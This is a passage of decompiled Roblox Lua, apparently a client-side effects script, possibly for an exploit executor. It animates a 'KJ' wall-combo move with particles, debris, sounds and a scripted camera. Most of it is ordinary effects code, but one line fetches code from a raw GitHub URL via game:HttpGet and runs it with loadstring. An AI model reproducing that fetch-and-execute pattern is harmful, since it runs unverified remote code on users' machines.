                                            table.insert(u453, _Part4)
                                        end)
                                    else
                                        local v677 = delay
                                        local _keep = _add.keep

                                        if not _keep then
                                            local v679 = 5
                                            local v680 = 7
                                            local v681 = v502 or u86

                                            if not v680 and v679 then
                                                v680 = v679
                                                v679 = 1
                                            end
                                            if not (v680 or v679) then
                                                v679 = 0
                                                v680 = 1
                                            end

                                            _keep = v681:NextNumber(v679, v680)
                                        end

                                        v677(_keep, function()
                                            if _add.keep then
                                                u10:Create(_Part4, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                    CFrame = _CFrame3,
                                                    Size = _Part4.Size,
                                                }):Play()
                                                wait(2)
                                            end

                                            u10:Create(_Part4, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                                                CFrame = _Part4.CFrame * CFrame.new(0, -7, 0),
                                                Size = _Part4.Size / 1.5,
                                            }):Play()
                                            wait(2)
                                            _Part4:SetAttribute('OGCframe', nil)

                                            _Part4.Anchored = true

                                            local v682 = _Part4

                                            v682.AssemblyLinearVelocity = Vector3.zero
                                            v682.AssemblyAngularVelocity = Vector3.zero
                                            v682.Velocity = Vector3.zero
                                            _Part4.CFrame = CFrame.new(100000000, 100000000, 100000000)

                                            _Part4:Destroy()
                                            table.insert(u453, _Part4)
                                        end)
                                    end
                                end
                            end

                            return v562
                        end
                        local function u698(p684, p685, p686)
                            local v687, v688, v689 = pairs(p684:GetDescendants())

                            while true do
                                local u690

                                v689, u690 = v687(v688, v689)

                                if v689 == nil then
                                    break
                                end
                                if u690:IsA('ParticleEmitter') then
                                    local v691 = u690:GetAttributes()
                                    local _EmitDelay2 = v691.EmitDelay

                                    if _EmitDelay2 then
                                        local u693 = v691

                                        task.delay(_EmitDelay2, function()
                                            u690:Emit(u693.EmitCount)
                                        end)
                                    else
                                        u690:Emit(v691.EmitCount)
                                    end
                                    if v691.EmitDuration then
                                        u690.Enabled = true

                                        task.delay(v691.EmitDuration, function()
                                            u690.Enabled = false
                                        end)
                                    end
                                end
                                if u690:IsA('Beam') then
                                    local u694 = u690:GetAttributes()
                                    local _Duration2 = u694.Duration
                                    local u696 = not (p686 and p686.TweenTime) and 0.5 or p686.TweenTime

                                    local function u697()
                                        u10:Create(u690, TweenInfo.new(u696, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                                            Width1 = 0,
                                            Width0 = 0,
                                        }):Play()
                                    end

                                    (function()
                                        u10:Create(u690, TweenInfo.new(u696, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                                            Width1 = u694.Width1,
                                            Width0 = u694.Width0,
                                        }):Play()
                                    end)()

                                    if _Duration2 then
                                        task.delay(_Duration2, function()
                                            u697()
                                        end)
                                    end
                                end
                            end

                            if p685 then
                                u6:AddItem(p684, p685)
                            end
                        end
                        local function u706(p699, p700, p701, p702)
                            local v703 = p701 or u5.LocalPlayer

                            if _G.FeKJAn then
                                p700 = false
                            end

                            local _Animation = Instance.new('Animation')

                            _Animation.AnimationId = p699

                            local v705 = u116(v703):LoadAnimation(_Animation)

                            if p700 then
                                _Animation.AnimationId = 'rbxassetid://0'
                            end

                            v705:Play()

                            v705.Priority = p702 and Enum.AnimationPriority.Action or Enum.AnimationPriority.Action4

                            v705:AdjustSpeed(1)

                            return v705
                        end
                        local function u724(p707)
                            if typeof(p707.start) == 'Instance' then
                                if p707.start:IsA('Attachment') then
                                    p707.start = p707.start.WorldPosition
                                else
                                    p707.start = p707.start.Position
                                end
                            end

                            local v708 = Random.new(p707.Seed)
                            local _ = u335
                            local v709, v710, _, v711 = u446({
                                orig = p707.start,
                                dir = p707['end'],
                            })

                            if p707.Sound then
                                p707.Sound.CFrame = CFrame.new(v710)

                                shared.sfx(p707.Sound):Play()
                            end
                            if v709 then
                                local v712 = u452(CFrame.new(v710).UpVector, v711, (Vector3.new(0, 1, 0, 0)))
                                local _Attachment = Instance.new('Attachment')

                                _Attachment.Parent = v709

                                if not v709.Anchored then
                                    _Attachment.Parent = workspace.Terrain
                                end

                                _Attachment.WorldCFrame = CFrame.new(v710) * v712

                                if not p707.nosmoke then
                                    local v714 = 8

                                    if u238:GetAttribute('S_FastMode') then
                                        v714 = v714 / 2
                                    end

                                    local v715 = -0.001
                                    local v716 = 0.001
                                    local v717

                                    if v708 then
                                        v717 = v708
                                    else
                                        v717 = Random.new()
                                    end

                                    local v718

                                    if v716 or not v715 then
                                        v718 = v715
                                        v715 = v716
                                    else
                                        v718 = 1
                                    end
                                    if not (v715 or v718) then
                                        v718 = 0
                                        v715 = 1
                                    end

                                    local v719 = v717:NextNumber(v718, v715)
                                    local v720 = game.ReplicatedStorage.Resources.Smoke:Clone()

                                    v720.Parent = _Attachment
                                    v720.ZOffset = v720.ZOffset + v719
                                    v720.Color = ColorSequence.new(v709 == workspace.Terrain and Color3.fromRGB(227, 206, 157) or v709.Color)

                                    if p707.stronger then
                                        shared.resizeparticle(v720, p707.stronger.size1 or 4.2)

                                        v720.Speed = NumberRange.new(v720.Speed.Min * (4.5 - (p707.stronger.minus or 0)), v720.Speed.Max * (4.5 - (p707.stronger.minus or 0)))
                                        v720.Lifetime = NumberRange.new(v720.Lifetime.Min * 2, v720.Lifetime.Max * 2)
                                        v720.RotSpeed = NumberRange.new(v720.RotSpeed.Min * 0.35, v720.RotSpeed.Max * 0.35)
                                    else
                                        shared.resizeparticle(v720, 1.25)

                                        if p707.CloserCircle then
                                            v720.Speed = NumberRange.new(25, 50)

                                            shared.resizeparticle(v720, 0.7)

                                            v714 = v714 / 1.5
                                        end
                                        if p707.Closerr then
                                            shared.resizeparticle(v720, 0.55)

                                            v720.Speed = NumberRange.new(7, 25)
                                        end
                                    end
                                    if v709 ~= workspace.Terrain and not p707.NoCircleSmoke then
                                        v720:Emit(v714)
                                    end

                                    local v721 = 8

                                    if u238:GetAttribute('S_FastMode') then
                                        v721 = v721 / 2
                                    end

                                    local v722 = game.ReplicatedStorage.Resources.UpSmoke:Clone()

                                    v722.Parent = _Attachment
                                    v722.ZOffset = v722.ZOffset + v719
                                    v722.Color = ColorSequence.new(v709 == workspace.Terrain and Color3.fromRGB(227, 206, 157) or v709.Color)

                                    if p707.stronger then
                                        shared.resizeparticle(v722, p707.stronger.size2 or 4.2)

                                        v722.Speed = p707.speed1 or NumberRange.new(v722.Speed.Min * (4.5 - (p707.stronger.minus or 0)), v722.Speed.Max * (4.5 - (p707.stronger.minus or 0)))
                                        v722.Lifetime = NumberRange.new(v722.Lifetime.Min * 2, v722.Lifetime.Max * 2)
                                        v722.RotSpeed = NumberRange.new(v722.RotSpeed.Min * 0.35, v722.RotSpeed.Max * 0.35)
                                    else
                                        shared.resizeparticle(v722, 1.25)

                                        if p707.Closerr then
                                            shared.resizeparticle(v722, 0.3)

                                            v721 = v721 / 1.5
                                            v722.Speed = NumberRange.new(20, 35)
                                        end
                                    end

                                    shared.resizeparticle(v722, 1.25)

                                    if v709 ~= workspace.Terrain and not p707.NoUpSmoke then
                                        v722:Emit(v721)
                                    end
                                end

                                u6:AddItem(_Attachment, 9)

                                local v723 = v709.Material == Enum.Material.Sand or v709.Material == Enum.Material.Snow

                                if not p707.NoCrater2 then
                                    u683({
                                        ground = v709,
                                        cframe = CFrame.new(v710),
                                        amount = (p707.amount or (v723 and 7 or 10)) / 1.25,
                                        normal = v711,
                                        sand = v723 and true or nil,
                                        add = {sounds = true},
                                        sizemult = p707.sizemult,
                                        new = {
                                            5 * (p707.size or 1),
                                            5.5 * (p707.size or 1),
                                        },
                                        nosound = p707.nosound,
                                        angle = p707.angle,
                                        anglecfr = p707.anglecfr,
                                        nodebris = p707.nodebris,
                                        notiles = p707.notiles,
                                        Seed = p707.Seed,
                                    })
                                end
                            end
                        end

                        local u725 = u446

                        local function u745(p726, p727, p728)
                            local v729, v730, v731 = pairs(p726:GetChildren())
                            local u732 = {}

                            while true do
                                local v733

                                v731, v733 = v729(v730, v731)

                                if v731 == nil then
                                    break
                                end

                                u732[v733.Name] = v733
                            end

                            local u736 = setmetatable({}, {
                                __index = function(_, p734)
                                    return {
                                        Clone = function(_)
                                            local v735 = rawget(u732, p734):Clone()

                                            if not table.find(p727, v735) then
                                                table.insert(p727, v735)
                                            end

                                            return v735
                                        end,
                                    }
                                end,
                            })
                            local u737 = {_maid = {}}

                            function u737._maid.give(_, p738)
                                if not table.find(p727, p738) then
                                    table.insert(p727, p738)
                                end

                                return p738
                            end
                            function u737._maid.giveTask(_, p739)
                                if not table.find(p727, p739) then
                                    table.insert(p727, p739)
                                end

                                return p739
                            end

                            local function v744()
                                if u736 and u737 then
                                    table.clear(u736)
                                    table.clear(u737)
                                end
                                if u732 then
                                    table.clear(u732)

                                    u732 = nil
                                end

                                u737 = nil
                                u736 = nil

                                if p727 then
                                    local v740, v741, v742 = pairs(p727)

                                    while true do
                                        local v743

                                        v742, v743 = v740(v741, v742)

                                        if v742 == nil then
                                            break
                                        end
                                        if typeof(v743) ~= 'RBXScriptConnection' then
                                            if typeof(v743) == 'Instance' then
                                                v743:Destroy()
                                            end
                                        else
                                            v743:Disconnect()
                                        end

                                        p727[v742] = nil
                                    end

                                    table.clear(p727)
                                end

                                p727 = nil
                            end

                            task.delay(p728 or 10, v744)

                            return u736, u737, v744
                        end
                        local function u763(p746)
                            task.spawn(function()
                                local _ = p746.Char
                                local _ = p746.Radius
                                local _ = game.ReplicatedStorage.Resources.UFW

                                if true then
                                    (function(_)
                                        local _Position2 = p746.Position
                                        local _, _ = game.Workspace.CurrentCamera:WorldToScreenPoint(_Position2)
                                        local v748 = {
                                            totalradius = p746.Radius,
                                            partcount = p746.TotalParts,
                                        }
                                        local _Part5 = Instance.new('Part')

                                        _Part5.Transparency = 1
                                        _Part5.BrickColor = BrickColor.new('Really black')
                                        _Part5.CastShadow = false
                                        _Part5.Size = Vector3.new(6, 6, 0.009999999776482582, 0)
                                        _Part5.CanCollide = true
                                        _Part5.Anchored = true
                                        _Part5.Material = Enum.Material.Neon
                                        _Part5.Parent = workspace.Thrown
                                        _Part5.Position = p746.Position

                                        game.Debris:AddItem(_Part5, 24)

                                        local v756 = (function(p750, p751)
                                            local v752 = {}

                                            for v753 = 0, p750 do
                                                local v754 = math.acos(1 - 2 * (v753 / p750))
                                                local v755 = 9.79559267269995 * v753

                                                table.insert(v752, (Vector3.new(math.sin(v754) * math.cos(v755) * p751, math.sin(v754) * math.sin(v755) * p751, math.cos(v754) * p751)))
                                            end

                                            return v752
                                        end)(v748.partcount, v748.totalradius)

                                        tick()

                                        local v757, v758, v759 = pairs(v756)

                                        while true do
                                            local v760

                                            v759, v760 = v757(v758, v759)

                                            if v759 == nil then
                                                break
                                            end

                                            local v761 = _Part5:Clone()

                                            v761.Transparency = 1

                                            game.Debris:AddItem(v761, 24)

                                            v761.CFrame = CFrame.new(_Position2) * CFrame.new(v760)
                                            v761.CFrame = CFrame.new(v761.Position, _Part5.Position)
                                            v761.Parent = workspace.Thrown
                                            v761.Size = Vector3.new(v761.Size.X + 15, v761.Size.Y + 15, 0.2)

                                            local u762 = _Part5:Clone()

                                            u762.Transparency = 0.9

                                            game.Debris:AddItem(u762, 24)

                                            u762.CFrame = CFrame.new(_Position2) * CFrame.new(v760)
                                            u762.CFrame = CFrame.new(u762.Position, _Part5.Position)
                                            u762.Parent = workspace.Thrown

                                            u10:Create(u762, TweenInfo.new(0.15), {
                                                Size = Vector3.new(u762.Size.X + 15, u762.Size.Y + 15, 0.2),
                                                Transparency = 0,
                                            }):Play()
                                            task.delay(24, function()
                                                u10:Create(u762, TweenInfo.new(Random.new():NextNumber(0.15, 0.35)), {Transparency = 1}):Play()
                                                game.Debris:AddItem(u762, 0.5)
                                            end)
                                            task.wait(0.0075)
                                        end
                                    end)(p746.Char)
                                end
                            end)
                        end
                        local function u766(p764)
                            local _Sound3 = Instance.new('Sound')

                            _Sound3.Volume = 2
                            _Sound3.SoundId = 'rbxassetid://17150550093'
                            _Sound3.Parent = u201().Torso
                            _Sound3.Name = 'UltimateMusic'

                            u7:AddTag(_Sound3, 'UltimateMusic')

                            if not p764 then
                                _Sound3:Play()
                            end

                            _Sound3.Looped = true

                            return _Sound3
                        end
                        local function u885(p767)
                            u122()

                            local _Character2 = _LocalPlayer3.Character
                            local v769 = _LocalPlayer3
                            local u770 = p767 or v769.Character.Parent['Weakest Dummy']:Clone()

                            u770.Parent = v769.Character.Parent
                            u770.HumanoidRootPart.Anchored = true

                            local u771 = RaycastParams.new()

                            u771.FilterDescendantsInstances = {
                                workspace.Live,
                                workspace.Thrown,
                            }

                            local function u781(p772, p773)
                                p772 = p772

                                local v774

                                if p772:IsA('ParticleEmitter') then
                                    v774 = {p772}
                                elseif typeof(p772) ~= 'table' then
                                    v774 = p772:GetDescendants()
                                end

                                local v775, v776, v777 = pairs(v774)
                                local v778 = 0

                                while true do
                                    local u779

                                    v777, u779 = v775(v776, v777)

                                    if v777 == nil then
                                        break
                                    end

                                    local v780

                                    if u779:IsA('ParticleEmitter') and u779:GetAttribute('EmitCount') then
                                        v780 = (typeof(u779.Lifetime) == 'NumberRange' and u779.Lifetime.Max or u779.Lifetime) / u779.TimeScale

                                        if u779:GetAttribute('EmitDelay') and 0 < u779:GetAttribute('EmitDelay') then
                                            v780 = v780 + u779:GetAttribute('EmitDelay')

                                            task.delay(u779:GetAttribute('EmitDelay'), function()
                                                u779:Emit(u779:GetAttribute('EmitCount'))
                                            end)
                                        else
                                            u779:Emit(u779:GetAttribute('EmitCount'))
                                        end
                                        if p773 then
                                            task.delay(v780, u779.Destroy, u779)

                                            if v778 >= v780 then
                                                v780 = v778
                                            end
                                        else
                                            v780 = v778
                                        end
                                    else
                                        v780 = v778
                                    end

                                    v778 = v780
                                end

                                if p773 and typeof(p772) == 'Instance' then
                                    task.delay(v778, function()
                                        p772:Destroy()
                                    end)
                                end
                            end

                            local _KJEffects = game.ReplicatedStorage.Resources.KJEffects
                            local u783 = {}

                            task.spawn(function()
                                local _Thrown = workspace.Thrown
                                local v785 = _Character2
                                local v786 = u770
                                local _Torso2 = v785.Torso
                                local _HumanoidRootPart2 = v785.HumanoidRootPart
                                local _HumanoidRootPart3 = v786.HumanoidRootPart
                                local _KJWallCombo = _KJEffects.KJWallCombo

                                task.wait(0.15)

                                local v791 = _KJWallCombo.slam:Clone()

                                table.insert(u783, v791)

                                v791.CFrame = _HumanoidRootPart3.CFrame * CFrame.new(0, 0.7, 2.25)
                                v791.Parent = _Thrown

                                local v792 = workspace:Raycast(_HumanoidRootPart2.Position, _HumanoidRootPart2.CFrame.LookVector * 20, u771)

                                if v792 then
                                    local v793, v794, v795 = pairs(v791:GetDescendants())

                                    while true do
                                        local v796

                                        v795, v796 = v793(v794, v795)

                                        if v795 == nil then
                                            break
                                        end
                                        if v796:GetAttribute('ChangeColor') then
                                            v796.Color = ColorSequence.new(v792.Instance.Color)
                                        end
                                    end
                                end

                                u781(v791, true)
                                task.wait(2.7)

                                local v797 = _KJWallCombo.feet:Clone()

                                table.insert(u783, v797)

                                v797.CFrame = _HumanoidRootPart2.CFrame * CFrame.new(0.7870006561279297, -2.7, 1.7350006103515625) * CFrame.Angles(1.5707963267948966, 0, 0)
                                v797.Parent = _Thrown

                                local v798 = workspace:Raycast(_Torso2.CFrame.Position, Vector3.new(0, -10, 0, 0), u771)

                                if v798 then
                                    local v799, v800, v801 = pairs(v797:GetDescendants())

                                    while true do
                                        local v802, v803 = v799(v800, v801)

                                        if v802 == nil then
                                            break
                                        end

                                        v801 = v802

                                        if v803:GetAttribute('ChangeColor') then
                                            v803.Color = ColorSequence.new(v798.Instance.Color)
                                        end
                                    end
                                end

                                u781(v797, true)

                                local v804, v805, v806 = pairs({
                                    'Head',
                                    'Torso',
                                    'Left Arm',
                                    'Right Arm',
                                    'Left Leg',
                                    'Right Leg',
                                })
                                local v807 = {}

                                while true do
                                    local v808, v809 = v804(v805, v806)

                                    if v808 == nil then
                                        break
                                    end

                                    v806 = v808

                                    local v810 = v785:FindFirstChild(v809)

                                    if v810 then
                                        local v811, v812, v813 = pairs(_KJWallCombo.UserAura:GetChildren())

                                        while true do
                                            local v814

                                            v813, v814 = v811(v812, v813)

                                            if v813 == nil then
                                                break
                                            end

                                            local u815 = v814:Clone()

                                            table.insert(u783, u815)

                                            u815.Parent = v810

                                            table.insert(v807, u815)
                                            task.delay(math.random(1, 10) / 100, function()
                                                u815.Enabled = true
                                            end)
                                            u781(u815, false)
                                        end
                                    end
                                end

                                local v816 = _KJWallCombo.hold:Clone()

                                table.insert(u783, v816)

                                v816.CFrame = _HumanoidRootPart3.CFrame * CFrame.new(0, 0, 1)
                                v816.Parent = _Thrown

                                local _PointLight = v816.Attachment.PointLight
                                local v818, v819, v820 = pairs(v816:GetDescendants())

                                while true do
                                    local v821

                                    v820, v821 = v818(v819, v820)

                                    if v820 == nil then
                                        break
                                    end
                                    if v821:IsA('ParticleEmitter') then
                                        v821.Enabled = true
                                    end
                                end

                                task.spawn(function()
                                    local v822 = os.clock()

                                    repeat
                                        task.wait(0.03333333333333333)
                                        u10:Create(_PointLight, TweenInfo.new(0.03333333333333333), {
                                            Brightness = math.random(1, 60) * 0.1,
                                        }):Play()
                                    until os.clock() - v822 > 2.8

                                    u10:Create(_PointLight, TweenInfo.new(1), {Brightness = 0}):Play()
                                end)
                                task.wait(2.8)

                                local v823, v824, v825 = pairs(v816:GetDescendants())

                                while true do
                                    local v826

                                    v825, v826 = v823(v824, v825)

                                    if v825 == nil then
                                        break
                                    end
                                    if v826:IsA('ParticleEmitter') then
                                        v826.Enabled = false
                                    end
                                end

                                task.delay(3, v816.Destroy, v816)
                                task.wait(0.2)
                                shared.sfx({
                                    SoundId = 'rbxassetid://18443813318',
                                    CFrame = u113().CFrame,
                                    Volume = 10,
                                })

                                local v827 = _KJWallCombo.FinalImpact:Clone()

                                table.insert(u783, v827)

                                v827.CFrame = _HumanoidRootPart3.CFrame * CFrame.new(0, 0, 1) * CFrame.Angles(0, -1.5707963267948966, 0) * CFrame.new(0, 0, -1)
                                v827.Parent = _Thrown

                                u781(v827, true)

                                local _SpotLight = v827.Origin.SpotLight

                                table.insert(u783, _SpotLight)
                                u10:Create(_SpotLight, TweenInfo.new(0.3, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Brightness = 35}):Play()
                                task.delay(0.3, function()
                                    u10:Create(_SpotLight, TweenInfo.new(0.5), {Brightness = 0}):Play()
                                end)
                                task.wait(0.4)

                                local v829, v830, v831 = pairs(v807)

                                while true do
                                    local v832

                                    v831, v832 = v829(v830, v831)

                                    if v831 == nil then
                                        break
                                    end

                                    v832.Enabled = false

                                    task.delay(v832.Lifetime.Max, v832.Destroy, v832)
                                end
                            end)

                            local _Sound4 = Instance.new('Sound')

                            _Sound4.Parent = v769.Character.Torso
                            _Sound4.SoundId = 'rbxassetid://18443048724'
                            _Sound4.Volume = 2.2

                            _Sound4:Play()

                            local _Character3 = v769.Character
                            local v835 = u770
                            local _Animation2 = Instance.new('Animation')

                            _Animation2.AnimationId = 'rbxassetid://18447915110'

                            local v837 = v835.Humanoid.Animator:LoadAnimation(_Animation2)

                            v837:Play()

                            v837.Priority = Enum.AnimationPriority.Action4

                            v837:AdjustSpeed(1)

                            local _rbxassetid18447913645 = u706('rbxassetid://18447913645', true)

                            _rbxassetid18447913645.Stopped:Connect(function()
                                u131()

                                _Character3.HumanoidRootPart.Anchored = false
                                _Character3.Humanoid.AutoRotate = true

                                u770:Destroy()
                            end)

                            v835.HumanoidRootPart.CFrame = _Character3.HumanoidRootPart.CFrame

                            local _LookVector = v835.HumanoidRootPart.CFrame.LookVector
                            local v840 = -_LookVector

                            _Character3.HumanoidRootPart.CFrame = CFrame.new(_Character3.HumanoidRootPart.Position, _Character3.HumanoidRootPart.Position + _LookVector) * CFrame.new(0, 0, 2.5)
                            v835.HumanoidRootPart.CFrame = CFrame.new(v835.HumanoidRootPart.Position, v835.HumanoidRootPart.Position + v840)
                            _Character3.HumanoidRootPart.Anchored = true
                            v835.HumanoidRootPart.Anchored = true
                            _Character3.Humanoid.AutoRotate = false
                            v835.Humanoid.AutoRotate = false

                            local _ = game.TweenService
                            local _CurrentCamera = workspace.CurrentCamera
                            local _PrimaryPart = v769.Character.PrimaryPart
                            local u843 = tick()
                            local _KJEffects2 = game.ReplicatedStorage.Resources.KJEffects
                            local v845 = v769.PlayerGui:FindFirstChild('MobileJunk') and v769.PlayerGui.MobileJunk or v769.PlayerGui.inv

                            v845.Enabled = true

                            local u846 = {}
                            local u847 = false
                            local u848 = 0
                            local u849 = nil
                            local u850 = 0

                            for v851 = 1, 73 do
                                local v852 = v851
                                local v853 = _KJEffects2.Walls[v852]
                                local _ImageLabel = Instance.new('ImageLabel')

                                _ImageLabel.Image = v853.Texture
                                _ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
                                _ImageLabel.Size = UDim2.new(0, 1, 0, 1)
                                _ImageLabel.ZIndex = v852
                                _ImageLabel.Parent = v845
                                u846[v852] = _ImageLabel
                            end

                            local u855 = u187 or loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/what4'))()

                            if not u187 then
                                u187 = u855
                            end

                            local _Character4 = v769.Character
                            local _ = u12.RenderStepped:Connect(function(p857)
                                local v858 = p857 * 60

                                u850 = u850 + v858

                                local v859 = tonumber((math.ceil(u850)))
                                local v860 = u855[v859]

                                if _Character4.Parent and (v860 and v859 <= 358) then
                                    if _CurrentCamera.CameraType ~= Enum.CameraType.Scriptable then
                                        _CurrentCamera.CameraType = Enum.CameraType.Scriptable
                                    end
                                    if 175 <= v859 and not u847 then
                                        u847 = true

                                        task.spawn(function()
                                            local u861 = nil
                                            local u862 = 1
                                            local u863 = nil

                                            u863 = shared.loop(function()
                                                local v864 = u846[u862]

                                                if not v864 then
                                                    local v865, v866, v867 = pairs(u846)

                                                    while true do
                                                        local v868

                                                        v867, v868 = v865(v866, v867)

                                                        if v867 == nil then
                                                            break
                                                        end

                                                        v868:Destroy()
                                                    end

                                                    return u863()
                                                end

                                                u862 = u862 + 1
                                                v864.Size = UDim2.new(1, 0, 1, 0)

                                                if u861 then
                                                    u861:Destroy()
                                                end

                                                u861 = v864
                                            end, 24)
                                        end)
                                    end

                                    u848 = u848 + v858

                                    if v860 then
                                        if tick() - u843 <= 0.7 then
                                            local v869 = _CurrentCamera
                                            local _FieldOfView = _CurrentCamera.FieldOfView
                                            local _fov = v860.fov
                                            local v872 = 1 - 0.009 ^ p857

                                            v869.FieldOfView = _FieldOfView + (_fov - _FieldOfView) * v872
                                        else
                                            _CurrentCamera.FieldOfView = v860.fov
                                        end
                                    end
                                    if v860 then
                                        local _dededededededededededede, v874, v875, v876, v877, v878, v879, v880, v881, v882, v883, v884 = v860.cframe:match('([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+)')

                                        if tick() - u843 <= 0.7 then
                                            _CurrentCamera.CFrame = _CurrentCamera.CFrame:lerp(_PrimaryPart.CFrame * CFrame.new(tonumber(_dededededededededededede), tonumber(v874), tonumber(v875), tonumber(v876), tonumber(v877), tonumber(v878), tonumber(v879), tonumber(v880), tonumber(v881), tonumber(v882), tonumber(v883), tonumber(v884)), 1 - 0.00009 ^ p857)
                                        else
                                            _CurrentCamera.CFrame = _CurrentCamera.CFrame:lerp(_PrimaryPart.CFrame * CFrame.new(tonumber(_dededededededededededede), tonumber(v874), tonumber(v875), tonumber(v876), tonumber(v877), tonumber(v878), tonumber(v879), tonumber(v880), tonumber(v881), tonumber(v882), tonumber(v883), tonumber(v884)), 1 - 9e-42 ^ p857)
                                        end
                                    end
                                else
                                    u849:Disconnect()

                                    _CurrentCamera.CameraType = Enum.CameraType.Custom

                                    u10:Create(_CurrentCamera, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {FieldOfView = 70}):Play()
                                end
                            end)

                            _rbxassetid18447913645.Stopped:Wait()

                            return true
                        end
                        local function u1048(p886, p887)
                            u122()

                            if p886:IsA('Player') then
                                p886 = p886.Character
                            end

                            shared.SetCore(false)

                            local function u902(p888, p889, p890)
                                local v891, v892, v893 = pairs(p888:GetDescendants())

                                while true do
                                    local u894

                                    v893, u894 = v891(v892, v893)

                                    if v893 == nil then
                                        break
                                    end
                                    if u894:IsA('ParticleEmitter') then
                                        local v895 = u894:GetAttributes()
                                        local _EmitDelay3 = v895.EmitDelay

                                        if _EmitDelay3 then
                                            local u897 = v895

                                            task.delay(_EmitDelay3, function()
                                                u894:Emit(u897.EmitCount)
                                            end)
                                        else
                                            u894:Emit(v895.EmitCount)
                                        end
                                        if v895.EmitDuration then
                                            u894.Enabled = true

                                            task.delay(v895.EmitDuration, function()
                                                u894.Enabled = false
                                            end)
                                        end
                                    end
                                    if u894:IsA('Beam') then
                                        local u898 = u894:GetAttributes()
                                        local _Duration3 = u898.Duration
                                        local u900 = not (p890 and p890.TweenTime) and 0.5 or p890.TweenTime

                                        local function u901()
                                            u10:Create(u894, TweenInfo.new(u900, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                                                Width1 = 0,
                                                Width0 = 0,
                                            }):Play()
                                        end

                                        (function()
                                            u10:Create(u894, TweenInfo.new(u900, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                                                Width1 = u898.Width1,
                                                Width0 = u898.Width0,
                                            }):Play()
                                        end)()

                                        if _Duration3 then
                                            task.delay(_Duration3, function()
                                                u901()
                                            end)
                                        end
                                    end
                                end

                                if p889 then
                                    u6:AddItem(p888, p889)
                                end
                            end
                            local function u922(p903, p904, p905)
                                local v906, v907, v908 = pairs(p903:GetChildren())
                                local u909 = {}

                                while true do
                                    local v910

                                    v908, v910 = v906(v907, v908)

                                    if v908 == nil then
                                        break
                                    end

                                    u909[v910.Name] = v910
                                end

                                local u913 = setmetatable({}, {
                                    __index = function(_, p911)
                                        return {
                                            Clone = function(_)
                                                local v912 = rawget(u909, p911):Clone()

                                                if not table.find(p904, v912) then
                                                    table.insert(p904, v912)
                                                end

                                                return v912
                                            end,
                                        }
                                    end,
                                })
                                local u914 = {_maid = {}}

                                function u914._maid.give(_, p915)
                                    if not table.find(p904, p915) then
                                        table.insert(p904, p915)
                                    end

                                    return p915
                                end
                                function u914._maid.giveTask(_, p916)
                                    if not table.find(p904, p916) then
                                        table.insert(p904, p916)
                                    end

                                    return p916
                                end

                                local function v921()
                                    if u913 and u914 then
                                        table.clear(u913)
                                        table.clear(u914)
                                    end
                                    if u909 then
                                        table.clear(u909)

                                        u909 = nil
                                    end

                                    u914 = nil
                                    u913 = nil

                                    if p904 then
                                        local v917, v918, v919 = pairs(p904)

                                        while true do
                                            local v920

                                            v919, v920 = v917(v918, v919)

                                            if v919 == nil then
                                                break
                                            end
                                            if typeof(v920) ~= 'RBXScriptConnection' then
                                                if typeof(v920) == 'Instance' then
                                                    v920:Destroy()
                                                end
                                            else
                                                v920:Disconnect()
                                            end

                                            p904[v919] = nil
                                        end

                                        table.clear(p904)
                                    end

                                    p904 = nil
                                end

                                task.delay(p905 or 10, v921)

                                return u913, u914, v921
                            end

                            u10:Create(p886.HumanoidRootPart, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
                                CFrame = p887.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3.8) * CFrame.Angles(0, math.rad(180), 0),
                            }):Play()
                            u60(p886.HumanoidRootPart, p887.HumanoidRootPart, 7.5, CFrame.new(0, 0, -3.8) * CFrame.Angles(0, math.rad(180), 0))

                            local _Animation3 = Instance.new('Animation')

                            _Animation3.AnimationId = 'rbxassetid://18440389930'

                            local v924 = p887.Humanoid:LoadAnimation(_Animation3)

                            v924:Play()

                            v924.Priority = Enum.AnimationPriority.Action4
                            v924.Looped = false

                            local _Animation4 = Instance.new('Animation')

                            _Animation4.AnimationId = 'rbxassetid://18440398084'

                            local v926 = p886.Humanoid:LoadAnimation(_Animation4)

                            v926:Play()

                            v926.Priority = Enum.AnimationPriority.Action4

                            local _ = game.ReplicatedStorage.Cutscenes
                            local v927 = 0
                            local v928 = nil
                            local v929 = 0
                            local u930 = u204

                            if not u204 then
                                u204 = u930
                            end

                            local _ = workspace
                            local _CurrentCamera2 = workspace.CurrentCamera
                            local _Sound5 = Instance.new('Sound')

                            _Sound5.Parent = workspace
                            _Sound5.SoundId = 'rbxassetid://18440861190'
                            _Sound5.Volume = 2

                            local v933 = _Sound5

                            _Sound5.Play(v933)

                            local u934 = nil

                            u934 = _Sound5.Ended:Connect(function()
                                if _Sound5 then
                                    _Sound5:Destroy()
                                end

                                return u934:Disconnect()
                            end)

                            local u935 = tick()
                            local u936 = p886
                            local _PrimaryPart2 = p887.PrimaryPart
                            local u938 = v927
                            local u939 = v928
                            local u940 = v929
                            local u941 = false

                            task.delay(9.3, function()
                                u941 = true
                            end)

                            u939 = u12.RenderStepped:Connect(function(p942)
                                local v943 = p942 * 60

                                u938 = u938 + v943

                                local v944 = u930[tonumber((math.ceil(u938)))]

                                if u936.Parent and not u941 then
                                    if _CurrentCamera2.CameraType ~= Enum.CameraType.Scriptable then
                                        _CurrentCamera2.CameraType = Enum.CameraType.Scriptable
                                    end

                                    u940 = u940 + v943

                                    if v944 then
                                        if tick() - u935 <= 1.8 then
                                            local v945 = _CurrentCamera2
                                            local _FieldOfView2 = _CurrentCamera2.FieldOfView

                                            v945.FieldOfView = _FieldOfView2 + (v944.fov - _FieldOfView2) * 0.25
                                        else
                                            _CurrentCamera2.FieldOfView = v944.fov
                                        end
                                    end
